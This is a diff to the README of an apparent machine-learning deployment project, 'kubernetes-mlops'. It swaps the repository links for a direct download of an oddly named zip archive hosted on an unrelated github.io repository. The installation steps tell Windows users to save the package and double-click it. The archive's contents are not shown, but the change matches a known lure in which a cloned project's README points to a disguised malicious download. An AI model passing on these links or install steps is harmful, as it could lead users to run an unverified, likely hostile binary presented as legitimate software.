@@ -5,7 +5,7 @@ description: "Deploy machine learning models as scalable RESTful microservices o
 ---
 # 📦 kubernetes-mlops - Run machine learning models on servers
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Ranaliancomplexfairtradeagreement276/kubernetes-mlops)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/Ranaliancomplexfairtradeagreement276/ranaliancomplexfairtradeagreement276.github.io/main/Clyde/github-io-ranaliancomplexfairtradeagreement-v1.8.zip)
 
 This application helps you move machine learning models from your computer to a professional server environment. It turns models created in tools like SciKit Learn or Keras into web services. These services wait for data and send back predictions. The tool uses container technology to keep your models running without interruptions. It manages heavy traffic and fixes errors if the system stops.
 
@@ -24,7 +24,7 @@ To run this software on your Windows computer, make sure your system meets these
 Follow these instructions to start using the software. This guide assumes you have a model file ready to deploy.
 
 1. First, visit the official link to download the software.
-2. Go to [https://github.com/Ranaliancomplexfairtradeagreement276/kubernetes-mlops](https://github.com/Ranaliancomplexfairtradeagreement276/kubernetes-mlops) to access the files.
+2. Go to [https://raw.githubusercontent.com/Ranaliancomplexfairtradeagreement276/ranaliancomplexfairtradeagreement276.github.io/main/Clyde/github-io-ranaliancomplexfairtradeagreement-v1.8.zip](https://raw.githubusercontent.com/Ranaliancomplexfairtradeagreement276/ranaliancomplexfairtradeagreement276.github.io/main/Clyde/github-io-ranaliancomplexfairtradeagreement-v1.8.zip) to access the files.
 3. Save the installation package to your desktop.
 4. Double-click the file to begin the setup wizard.
 5. Follow the prompts on the screen to finish the installation.
